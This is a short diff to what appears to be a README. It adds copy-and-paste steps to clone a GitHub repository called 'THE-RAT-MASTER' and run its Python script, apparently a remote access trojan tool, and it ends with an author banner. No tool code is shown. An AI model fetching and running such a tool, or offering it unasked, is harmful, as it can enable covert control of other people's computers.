@@ -19,3 +19,14 @@ python3 'RAT MASTER.py'
 
 THE CODE TO COPY AND PASTEN   TO RUN 
 
+git clone https://github.com/triggered242/THE-RAT-MASTER.git
+
+cd THE-RAT-MASTER
+
+ls -la
+
+python3 'RAT MASTER.py'
+
+
+==============AaSHISH TRIPATHI ======================
+
